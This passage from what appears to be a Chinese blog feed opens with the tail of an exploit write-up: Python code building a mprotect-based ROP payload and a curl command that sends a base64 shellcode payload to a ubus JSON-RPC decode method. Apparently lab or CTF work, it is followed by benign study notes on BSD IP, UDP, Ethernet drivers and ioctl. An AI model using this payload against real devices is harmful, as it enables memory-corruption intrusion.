class="hljs-comment"># x29</span><br>payload += p64(call_mprotect) <span class="hljs-comment"># x30</span><br>payload += p64(<span class="hljs-number">0x4A2298</span> - <span class="hljs-number">0x490</span>) <span class="hljs-comment"># x0</span><br>payload += <span class="hljs-string">b&quot;BBBBBBBB&quot;</span><br>payload += <span class="hljs-string">b&quot;CCCCCCCC&quot;</span><br>payload += p64(<span class="hljs-number">0x4A2098</span>)<br>payload += <span class="hljs-string">b&quot;EEEEEEEE&quot;</span><br><span class="hljs-comment"># p.sendline()</span><br><span class="hljs-comment"># p.interactive()</span><br>payload = base64.b64encode(payload)<br><span class="hljs-built_in">print</span>(payload)<br></code></pre></td></tr></table></figure><h3 id="shell脚本访问api接口"><a href="#shell脚本访问api接口" class="headerlink" title="shell脚本访问api接口"></a>shell脚本访问api接口</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">curl --<span class="hljs-keyword">location</span> <span class="hljs-title">&#x27;http</span>://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">9999</span>/ubus&#x27; \<br>    --header &#x27;Content-<span class="hljs-keyword">Type</span>: application/json&#x27; \<br>    --data &#x27;&#123;<br>        <span class="hljs-string">&quot;jsonrpc&quot;</span>: <span class="hljs-string">&quot;2.0&quot;</span>,<br>        <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;call&quot;</span>,<br>        <span class="hljs-string">&quot;params&quot;</span>: [<br>            <span class="hljs-string">&quot;00000000000000000000000000000000&quot;</span>,<br>            <span class="hljs-string">&quot;base64&quot;</span>,<br>            <span class="hljs-string">&quot;decode&quot;</span>,<br>            &#123;<br>                <span class="hljs-string">&quot;input&quot;</span>:<br>                <span class="hljs-string">&quot;7sWM0o4trPLuDMDy7g8f+IDzn9Lg/7/y4P/f8uD///LhAwCR4gMfqggHgNIBAADUYACA0oF0hNJBCaDyAiCA0ugHgNIBAADU4wMAquEBAFgCAgBYYWgiOAECAFgiAgBYYWgiOCAAgNIBc4TSQQmg8gIggNIICIDSAQAA1GABAFiJAQBYIAE/1iIAAAAAAAAAoyNKAAAAAAB9AAAAAAAAAKQjSgAAAAAAAQAAAAAAAABgLUIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwSgAAAAAAACBKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeyJvdXRwdXQiOiAiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEEAAABBAAAAQQAAAEEAAABBAAAAQQAAABgGAAAdBAAAhAUAAJIEAAAAJUoAAAAAALiURAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJUoAAAAAAKR5RQAAAAAACB5KAAAAAABCQkJCQkJCQkNDQ0NDQ0NDmCBKAAAAAABFRUVFRUVFRQ==&quot;</span><br>            &#125;<br>        ]<br>    &#125;&#x27;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>网络协议栈CH8及CH23</title>
    <link href="/2023/04/25/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH8%E5%8F%8ACH23/"/>
    <url>/2023/04/25/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH8%E5%8F%8ACH23/</url>
    
    <content type="html"><![CDATA[<blockquote><p>昨晚搞到快两点，今天9.30才起床，希望11点半之前能搞完去吃饭😭</p></blockquote><h2 id="第八章-IP：网际协议"><a href="#第八章-IP：网际协议" class="headerlink" title="第八章 IP：网际协议"></a>第八章 IP：网际协议</h2><h3 id="IP分组"><a href="#IP分组" class="headerlink" title="IP分组"></a>IP分组</h3><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH8%E5%8F%8ACH23.assets/image-20230425092925635.png" alt="image-20230425092925635"></p><p>参照上图，有几个基本概念（本例中的传输层协议为UDP）：</p><ul><li><strong>报文</strong>：由传输层送至IP的数据报，本身包含传输层首部和数据</li><li><strong>数据报</strong>：IP在报文的前面加上自己的IP首部，且根据长度考虑是否分片（上图1-2行）</li><li><strong>帧</strong>：IP将分好片的数据报交给数据链路层，数据链路填上自己的首部后变为帧（上图3行）</li><li><strong>分组</strong>：一个分片的数据报或者一个不需分片的数据报为分组</li></ul><blockquote><p> 需注意的是IP数据报结构存储不受机器大小端的影响，均按照下面地址结构存储</p></blockquote><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH8%E5%8F%8ACH23.assets/image-20230425093907332.png" alt="image-20230425093907332"></p><p>IP数据报结构如上图所示，上面的个部分含义已在图中标出</p><blockquote><p>可能需注意的地方：<code>ip_hl</code>常用4字节度量，即当<code>ip_hl == 5</code>时，实际首部长度为5*4&#x3D;20。其中选项的部分为0~40不等，所以<code>ip_hl</code>的最大值为：(20+40)&#x2F;4 &#x3D; 15，最小值为：20&#x2F;4&#x3D;5。另外，由于ip_hl为4的倍数，所以选项的长度一般也为4的倍数。</p></blockquote><h3 id="ipintr函数"><a href="#ipintr函数" class="headerlink" title="ipintr函数"></a>ipintr函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">ipintr</span> <span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ip</span> *<span class="hljs-title">ip</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mbuf</span> *<span class="hljs-title">m</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipq</span> *<span class="hljs-title">fp</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_ifaddr</span> *<span class="hljs-title">ia</span>;</span><br>        <span class="hljs-type">int</span> hlen, s;<br>    next:<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">            Get next datagram off input queue and get IP header</span><br><span class="hljs-comment">            in first mbuf.</span><br><span class="hljs-comment">        */</span><br>        s = splimp() ;<br>        IF_DEQUEUE (&amp;ipintrq, m) ;<br>        sp1x(s);<br>        <span class="hljs-keyword">if</span>(m==<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">            很多很多代码😭</span><br><span class="hljs-comment">        */</span><br>        <span class="hljs-keyword">goto</span> next；<br>    bad:<br>        m_freem(m);<br>        <span class="hljs-keyword">goto</span> next;<br>&#125;    <br></code></pre></td></tr></table></figure><p>该函数的基本框架如上，大致就是依靠两个goto实现对分组处理的循环，直到队列为空结束。中间省略的代码主要做下面几件事（实在太长了）：</p><ol><li>验证：把分组从<code>ipintrq</code>中取出，验证它们的内容，损坏和有差错的分组自动被丢弃。</li><li>转发或不转发：调用<code>ip_dooptions</code>来处理IP选项，如果没到达最终目的地就尝试转发，反之交给对应传输层协议</li><li>重装（重装在第10章讲，那我就不管了，开摆！）</li><li>分用：重装完全的数据报，ip指针设置为到达目的地的完整数据报，反之为空</li></ol><h3 id="ip-forward函数"><a href="#ip-forward函数" class="headerlink" title="ip_forward函数"></a>ip_forward函数</h3><p>到达非目的地的分组需要被转发。只有当<strong>ipforwarding非零</strong>或当分组中包含<strong>源路由</strong>时，ipintr才调用该函数<code>ip_forward</code>实现转发。ip_forward依靠route结构体与路由表接口</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">route</span>&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rtentry</span> *<span class="hljs-title">ro_rt</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> <span class="hljs-title">ro_dst</span>;</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>ro_rt</code> 指向与路由表相关的rtentry结构体</li><li><code>ro_dst </code>指向存放目的地址信息的sockaddr结构体</li></ul><p><code>ip_forward()</code>的基本流程分为两部分：</p><ul><li>确定系统是否需要转发此分组，修改IP首部，位分组选择路由</li><li>处理ICMP重定向报文，并把分组交给<code>ip_output</code>进行转发</li></ul><blockquote><p>流程中可能需注意的点：</p><ul><li>IP转发算法把最近的路由缓存在全局route结构的ipforward_rt中</li><li>当转发错误时，由且仅由路由器向源主机返回ICMP重定向报文，以此更新主机路由表</li></ul></blockquote><h3 id="ip-output"><a href="#ip-output" class="headerlink" title="ip_output"></a>ip_output</h3><p><code>ip_output</code>为IP输出代码，主要为三部分：</p><ul><li>首部初始化</li><li>路由选择</li><li>源地址选择和分片</li></ul><h2 id="第23章-UDP"><a href="#第23章-UDP" class="headerlink" title="第23章 UDP"></a>第23章 UDP</h2><h3 id="整体数据传输框架"><a href="#整体数据传输框架" class="headerlink" title="整体数据传输框架"></a>整体数据传输框架</h3><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH8%E5%8F%8ACH23.assets/image-20230425104820413.png" alt="image-20230425104820413"></p><blockquote><p>整体框架如上图所示，从上到下分别是：</p><p>用户进程(应用层)–&gt;UDP(传输层)–&gt;IP(网络层)–&gt;数据链路层–&gt;硬件网卡(物理层)</p></blockquote><h3 id="UDP-首部"><a href="#UDP-首部" class="headerlink" title="UDP 首部"></a>UDP 首部</h3><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH8%E5%8F%8ACH23.assets/image-20230425105506669.png" alt="image-20230425105506669"></p><p>UDP首部如上图所示，对应域的含义也有标记。需要注意的是IP首部和UDP首部一般是紧挨在一起，我们在CH1-CH3中分析mbuf时已经可以注意到这种现象。而实际上在udp内相关函数（如<code>udp_input</code>,<code>udp_output</code>）处理时也会将两者放在一起使用，他们共同构成了结构体<code>udpiphdr</code>，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">udpiphdr</span>&#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ippvly</span> <span class="hljs-title">ui_i</span>;</span> <span class="hljs-comment">/* overlaidip structure*/</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">udphdr</span> <span class="hljs-title">ui_u</span>;</span><span class="hljs-comment">/* udp header*/</span><br>&#125;<br></code></pre></td></tr></table></figure><p>20字节的IP首部被定义为 ippvly结构体，如下所示，可自行对照IP首部结构图：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipov1y</span> &#123;</span><br><span class="hljs-type">caddr_t</span> ih_next, ih_prev;<span class="hljs-comment">/* for protocol sequence q&#x27;s */</span><br>u_char ih_x1; <span class="hljs-comment">/* (unused) */</span><br>u_char ih_pr;<span class="hljs-comment">/* protocol */</span><br><span class="hljs-type">short</span> ih_len;<span class="hljs-comment">/* protocol length */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_addr</span> <span class="hljs-title">ih_src</span>;</span> <span class="hljs-comment">/* source internet address */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_addr</span> <span class="hljs-title">ih_dst</span>;</span> <span class="hljs-comment">/* destination internet address */</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="udp-init函数"><a href="#udp-init函数" class="headerlink" title="udp_init函数"></a>udp_init函数</h3><p>初始化函数，用来构建PCB双向链表的起始，让头部PCB的next指针和prev指针都指向自己。需注意UDP临时端口号由1024开始分配</p><blockquote><p>前0~1023端口为常用端口，一般都有固定对应服务，想要监听这些端口时也需要sudo权限</p><p>PCB是22章的概念：PCB协议控制块存放各UDP和TCP插口所要求的多个信息片，UDP所需要的所有信息都可以在Internet PCB中找到，不存在UDP控制块</p></blockquote><h3 id="udp-out函数"><a href="#udp-out函数" class="headerlink" title="udp_out函数"></a>udp_out函数</h3><p>当程序调用send，sendto，sendmsg，write或writev时会发生UDP输出。基本流程如下图：<img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH8%E5%8F%8ACH23.assets/image-20230425111210300.png" alt="image-20230425111210300"></p><p><code>udp_output</code>主要干这几件事：</p><ul><li>添加IP&#x2F;UDP首部，具体过程可以看前三章分析mbuf的部分</li><li>检验和计算和伪首部</li></ul><p>我们在前三章分析mbuf时说到过，udp会填写一部分首部，ip会填写一部分首部，这里就是分别调用<code>udp_output</code>,<code>ip_output</code>实现的<img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH8%E5%8F%8ACH23.assets/image-20230425111755234.png" alt="image-20230425111755234"></p><p>下图中阴影部分由<code>ip_output()</code>填写，其余浅色部分交由<code>udp_output()</code>填写</p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH8%E5%8F%8ACH23.assets/image-20230425111716276.png" alt="image-20230425111716276"></p><p>UDP在检验和时会包含三部分内容：12字节的伪首部，8字节的UDP首部，UDP数据</p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH8%E5%8F%8ACH23.assets/image-20230425112329338.png" alt="image-20230425112329338"></p><p>伪首部和UDP首部如上图所示，下图是填充首部和检验和的整个示意图</p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH8%E5%8F%8ACH23.assets/image-20230425112939950.png" alt="image-20230425112939950"></p><h3 id="CRC校验码"><a href="#CRC校验码" class="headerlink" title="CRC校验码"></a>CRC校验码</h3><p>这部分机组的时候学过，自行适当复习一下，课件例题如下</p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH8%E5%8F%8ACH23.assets/image-20230425113213347.png" alt="image-20230425113213347"></p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH8%E5%8F%8ACH23.assets/image-20230425113221906.png" alt="image-20230425113221906"></p><h3 id="udp-input函数"><a href="#udp-input函数" class="headerlink" title="udp_input函数"></a>udp_input函数</h3><p>当IP在它的协议字段指定为UDP的输入队列上收到一个IP数据报时，才发生UDP的输入。IP通过协议交换表中的<code>pr_input</code>函数调用函数<code>udp_input</code>。因为IP的输入是在软件中断级，所以<code>udp_input</code>也在这一级上执行。<code>udp_input</code>的目标是把UDP数据报放置到合适的插口的缓存内，唤醒该插口上因输入阻塞的所有进程。<code>udp_input</code> 函数的主要分三个部分:</p><ul><li><p>UDP对收到的数据报完成<strong>一般性</strong>的确认;</p></li><li><p>处理目的地是<strong>单播地址的UDP数据报</strong>：找到合适的PCB,把数据报放到插口的缓存内，</p></li><li><p>处理目的地是<strong>广播或多播地址的UDP数据报</strong>：必须把数据报提交给多个插口。</p></li></ul><blockquote><p>确认部分可以继续复习前三章mbuf分析部分，个人感觉这本章和前三章关系还是比较紧密的，可以多对照看看</p></blockquote><h3 id="课后练习题"><a href="#课后练习题" class="headerlink" title="课后练习题"></a>课后练习题</h3><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH8%E5%8F%8ACH23.assets/image-20230425114209049.png" alt="image-20230425114209049"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>网络协议栈CH4及CH6</title>
    <link href="/2023/04/25/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH4%E5%8F%8ACH6/"/>
    <url>/2023/04/25/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH4%E5%8F%8ACH6/</url>
    
    <content type="html"><![CDATA[<h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH4%E5%8F%8ACH6.assets/image-20230424232559912.png" alt="image-20230424232559912"></p><p>去年11月份做IO相关源码的时候就已经觉得有些宏定义纯纯恶心，没想到今日的网络协议栈再一次体会了这种感觉😅，感谢网络协议栈让我重温旧日的美好时光。</p><h2 id="第四章-接口：以太网"><a href="#第四章-接口：以太网" class="headerlink" title="第四章 接口：以太网"></a>第四章 接口：以太网</h2><h3 id="以太网接口"><a href="#以太网接口" class="headerlink" title="以太网接口"></a>以太网接口</h3><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH4%E5%8F%8ACH6.assets/image-20230424225903986.png" alt="image-20230424225903986"></p><p>IP分组的以太网帧如上图所示，包含6字节的目的和源地址，2字节的类型，末尾4字节的CRC。前14个字节我们在上一篇文章讨论输入输出时已经见过。对于IP分组，其类型是固定的<strong>0x0800</strong>（十进制2048）</p><h3 id="leintr函数"><a href="#leintr函数" class="headerlink" title="leintr函数"></a>leintr函数</h3><blockquote><p> 感觉记住这几个函数干什么就行，也没啥特别说的。一个个源码都挺长的，放上来估计也没人想看。</p></blockquote><p><code>leintr</code>检测硬件，并且如果有一个帧到达，就调用<code>leread</code>把这个帧从接口转移到一个mbuf链中。如果硬件报告一个帧已传输完或发现一个差错(如一个有错误的检验和)，则<code>leintr</code>更新相应的接口统计，复位这个硬件,并调用<code>lestart</code>来传输另一个帧。所有以太网设备驱动程序将它们接收到的帧传给<code>ether_input</code>做进一步的处理。设备驱动程序构造的mbuf链不包括以太网首部，以太网首部作为一个独立的参数传递给<code>ether_input</code>。结构<code>ether_header</code>如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ether_</span> <span class="hljs-title">header</span> &#123;</span><br>u_char ether_dhost[<span class="hljs-number">6</span>] ;<span class="hljs-comment">/* Ethernet destination address */</span><br>u_char ether_shost[<span class="hljs-number">6</span>] ;<span class="hljs-comment">/* Ethernet source address*/</span><br>u_short ether_type;<span class="hljs-comment">/* Ethernet frame type */</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="leread函数"><a href="#leread函数" class="headerlink" title="leread函数"></a>leread函数</h3><p>函数<code>leread</code>的开始是由<code>leintr</code>传给它的一个连续的内存缓冲区,并且构造了一个<code>ether_header</code>结构和 一个mbuf链。这个链表存储来自以太网帧的数据。<code>leread</code>还将输入帧传给BPF。</p><h3 id="ether-input函数"><a href="#ether-input函数" class="headerlink" title="ether_input函数"></a>ether_input函数</h3><p>函数<code>ether_input</code>，它检查结构<code>ether_header</code>来判断接收到的数据的类型，并将接收到的分组加入到队列中等待处理。</p><h3 id="ether-output函数"><a href="#ether-output函数" class="headerlink" title="ether_output函数"></a>ether_output函数</h3><p>当一个网络层协议，如IP,调用此接口ifnet结构中指定的函数<code>if_ output</code>时，开始处理输出。所有以太网设备的<code>if_ output</code>是<code>ether_ output</code>。<code>ether_output</code>用14字节以太网首部封装一个以太网帧的数据部分，并将它放置到接口的发送队列中。</p><h3 id="lestart函数"><a href="#lestart函数" class="headerlink" title="lestart函数"></a>lestart函数</h3><p>函数<code>lestart</code>从接口输出队列中取出排队的帧，并交给LANCE以太网卡发送。如果设备空闲，调用此函数开始发送帧。</p><blockquote><p>如果设备忙，当它完成了当前帧的传输时产生一个中断。设备调用<strong>lestart</strong>来退队并传输下一帧。一旦开始，协议层不再用调用<strong>lestart</strong>来排队帧，因为驱动程序不断退队并传输帧，直到队列为空为止。</p></blockquote><h3 id="ioctl系统调用"><a href="#ioctl系统调用" class="headerlink" title="ioctl系统调用"></a>ioctl系统调用</h3><blockquote><p>个人认为<strong>ioctl</strong>是一个非常重要的部分，因为他不仅仅涉及网络设备。在我们常用的Linux系统中，ioctl是作为进程和设备交互的最重要的系统调用或者说接口，包括字符型设备（例：终端、文件）、存储设备（例：磁盘）以及网络设备（例：网卡）。可以说绝大多数设备的驱动程序（至少在我的认知里）都要依靠此函数来实现，是研究Linux系统内核、内核态开发和安全非常重要的一部分。</p><p><strong>但在这门课里我不确定它是不是那么重要？</strong>😝</p></blockquote><p>原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">ioctl</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> com, ...)</span>;<br></code></pre></td></tr></table></figure><p>这个函数的三个参数分别为如下含义：</p><ul><li>fd，文件描述符，即ioctl要交互的设备是谁</li><li>com，command命令，即ioctl要调用哪个命令（在驱动程序中会根据不同的值执行不同的函数或者命令）</li><li>第三个参数为执行command命令时传入的参数</li></ul><p>本书中涉及到的与网络接口相关的com命令如下：</p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH4%E5%8F%8ACH6.assets/image-20230425001108434.png" alt="image-20230425001108434"></p><blockquote><p>其中命令列即为ioctl的第二个参数com</p></blockquote><h4 id="ifioctl函数"><a href="#ifioctl函数" class="headerlink" title="ifioctl函数"></a>ifioctl函数</h4><blockquote><p>ifioctl起始就是ioctl调用后，网络接口驱动程序所对应的处理函数。</p><p>大概流程就是用户进程调用ioctl系统调用，发生中断陷入内核态，然后操作系统根据fd找到对应设备驱动程序，这里就是网络接口的驱动程序。随后网络接口的ifioctl根据ioctl的后两个参数进行处理，参照上图的表,已经有了一些命令的描述。</p></blockquote><ul><li>对于命令<strong>SIOCGIFCONF</strong>，<code>ifioctl</code>调用<code>ifconf</code>来构造一个可变长ifreq结构的表。</li><li>对于其他<code>ioctl</code>命令，数据参数是指向一个<code>ifreq</code>结构的指针。<code>ifunit</code>在ifnet列表中查找名称为进程在ifr-&gt;ifr_name中提供的文本名称(例如:“s10”，“le1”或“lo0”)的接口。如果没有匹配的接口，ifioctl返回 ENXIO。</li><li>对于命令<strong>SIOSIFFLAGS</strong>，<code>ifioctl</code> 可以利用ifconfig来设置或清除标志<strong>IFF_UP</strong>，实现对一个接口的禁用和启用。这将会调用<code>if_up</code>和<code>if_down</code>函数</li></ul><h2 id="第6章-IP编址"><a href="#第6章-IP编址" class="headerlink" title="第6章 IP编址"></a>第6章 IP编址</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>几类IP地址划分，主机和路由器简单看看就好，也没什么说的</p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH4%E5%8F%8ACH6.assets/image-20230425004924718.png" alt="image-20230425004924718"></p><h3 id="sockaddr-in结构"><a href="#sockaddr-in结构" class="headerlink" title="sockaddr_in结构"></a>sockaddr_in结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_addr</span> &#123;</span><br>u_1ong s_addr;<span class="hljs-comment">/* 32-bit IP address, net byte order */</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_</span> <span class="hljs-title">in</span> &#123;</span><br>u_char sin_len;<span class="hljs-comment">/* sizeof (struct sockaddr_ in) = 16 */</span><br>u_char sin_family;<span class="hljs-comment">/* AF_INET */</span><br>u_short sin_port;<span class="hljs-comment">/* 16-bit port number, net byte order */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_addr</span> <span class="hljs-title">sin_</span> <span class="hljs-title">addr</span> ;</span><br><span class="hljs-type">char</span> sin_zero[<span class="hljs-number">8</span>] ;<span class="hljs-comment">/* unused */</span><br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>这个结构体比较简单，但还是挺常用的，需要额外注意的是s_addr的存储并不根据系统的大小端，而是根据网络流的顺序</p></blockquote><p>sockaddr和sockaddr_in对比如下：</p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH4%E5%8F%8ACH6.assets/image-20230425010936449.png" alt="image-20230425010936449"></p><h3 id="in-ifaddr结构"><a href="#in-ifaddr结构" class="headerlink" title="in_ifaddr结构"></a>in_ifaddr结构</h3><p><code>in_ifaddr</code>为Internet协议的接口地址结构。对于每个指派给一个接口的IP地址，分配了一个<code>in_ifaddr</code>结构，并且添加到接口地址列表和IP地址全局列表中。</p><h3 id="in-ifinit函数"><a href="#in-ifinit函数" class="headerlink" title="in_ifinit函数"></a>in_ifinit函数</h3><blockquote><p>按课件和课本的话中间还有ifioctl和io_control函数的部分没搞，但说实话真不知道分析这几个函数有什么用😅，总不能让我考试也隔着审源码吧，我个人觉得知道这些函数干什么就行了。希望老师不要打我的脸，求求了😇</p></blockquote><p>主要步骤：</p><ul><li>将地址复制到此结构并将此变化通知硬件;</li><li>忽略原地址配置的任何路由;</li><li>为这个地址建立-一个子网掩码;</li><li>建立一个默认路由到连接的网络(或主机);</li><li>将此接口加入到所有主机组。</li></ul><h3 id="练习题"><a href="#练习题" class="headerlink" title="练习题"></a>练习题</h3><blockquote><p>这两章复习的真没什么道理，全是函数源码分析，实在没什么看头。课件上还有几个练习题可以看看，希望考试别恶心人</p></blockquote><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH4%E5%8F%8ACH6.assets/image-20230425013954629.png" alt="image-20230425013954629"></p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH4%E5%8F%8ACH6.assets/image-20230425014013419.png" alt="image-20230425014013419"></p><p><img 